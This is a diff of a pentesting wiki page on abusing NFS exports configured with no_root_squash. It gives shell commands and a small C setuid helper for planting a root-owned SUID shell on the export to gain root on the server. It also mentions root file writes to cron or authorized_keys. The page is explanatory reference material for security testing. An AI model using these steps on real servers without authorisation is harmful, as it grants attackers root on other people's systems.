@@ -1,34 +1,45 @@
 ---
-title: "no_root_squash abuse: writing files as root over NFS"
-description: "Abusing an NFS export configured with no_root_squash, which lets a mounting client's root be treated as root on the server's files, to plant a root-owned SUID binary on the export and run it on the server for local privilege escalation or to write any file as root."
+title: "no_root_squash abuse: acting as root on an NFS export"
+description: "By default NFS maps a client's root (UID 0) to an unprivileged user (root squash). An export set with no_root_squash disables that, so a client mounting it as root creates and modifies files as real root on the server. The standard abuse writes a root-owned SUID binary to the export, then executes it on the server for local root."
 keywords:
   - no_root_squash
-  - NFS privilege escalation
-  - SUID binary
-  - root file write
-  - exports
+  - root squash
+  - suid
+  - nfs
+  - privilege escalation
 ---
 
 # no_root_squash abuse
 
-By default NFS squashes a remote root to `nobody`, but an export set with `no_root_squash` trusts a client's root as root on the server's files. A client that mounts such an export as its own root can create root-owned files on it, including a SUID-root binary, which then runs with root privileges on the server (or on any host that mounts the same export), turning file-share access into code execution as root.
+NFS normally protects the server by squashing a remote root: a request arriving with UID 0 is remapped to an unprivileged user (`nobody`), so a client cannot act as root on the export. When an export is configured with `no_root_squash`, that remapping is off, and a client that mounts the export while being root locally creates and modifies files as real UID 0 on the server. The classic escalation is to write a root-owned SUID executable into the export; because the file is genuinely owned by root on the server, running it there (by any local user or a separate foothold) yields root.
+
+## The technique
 
 ```bash
-# Mount the no_root_squash export as local root
-mount -t nfs <target>:/export /mnt/nfs
-# Plant a root-owned SUID shell on the export
-cp /bin/bash /mnt/nfs/rootbash && chown root:root /mnt/nfs/rootbash && chmod 4755 /mnt/nfs/rootbash
-# On the server (or any host mounting it), run it to get root
-/export/rootbash -p
+# 1. mount the no_root_squash export as local root on the attacker machine
+mount -t nfs -o vers=3 <target>:/srv/share /mnt/nfs
+# 2. write a SUID-root shell helper into the export, as root
+cat > /mnt/nfs/.s.c <<'C'
+#include <unistd.h>
+int main(){ setuid(0); setgid(0); execl("/bin/sh","sh",0); }
+C
+gcc -static /mnt/nfs/.s.c -o /mnt/nfs/.s
+chown root:root /mnt/nfs/.s       # succeeds because root is not squashed
+chmod 4755 /mnt/nfs/.s            # SUID root, owned by root on the server
+# 3. on the server (or any foothold there), run it to become root
+/path/on/server/.s                # -> root shell
 ```
+
+The write and `chown root` succeed only because `no_root_squash` lets your UID 0 be honoured; the SUID bit then grants root to whoever runs the binary on the server. A statically linked helper avoids library-path issues on the target.
 
 ## Exploitation notes
 
-- The SUID technique needs a foothold on a host that executes files from the export; on the server itself this is local root.
-- Even without execution, `no_root_squash` plus write is an arbitrary root file write: overwrite a cron job, authorized_keys, or a config.
-- It pairs with [UID and GID spoofing](uid-and-gid-spoofing.md) when you need to act as a specific non-root user instead.
+- This needs both `no_root_squash` on the export and the ability to execute the planted binary on the server, from an existing low-privilege foothold on the server, or any mechanism that runs files from the export.
+- Test for `no_root_squash` by mounting as root and attempting `chown root:root` on a file you create; success means the option is set.
+- If you cannot execute on the server directly, a SUID binary still helps a separate foothold; alternatively write into a root-owned location (cron, authorized_keys) that the server itself acts on.
+- Where only `all_squash` or `root_squash` is set, this fails and you fall back to [UID and GID spoofing](uid-and-gid-spoofing.md) for non-root identities.
 
 ## References
 
-- [man 5 exports](https://man7.org/linux/man-pages/man5/exports.5.html)
-- [HackTricks: NFS no_root_squash](https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html)
+- [exports(5): root_squash / no_root_squash](https://man7.org/linux/man-pages/man5/exports.5.html)
+- [HackTricks: NFS no_root_squash](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)
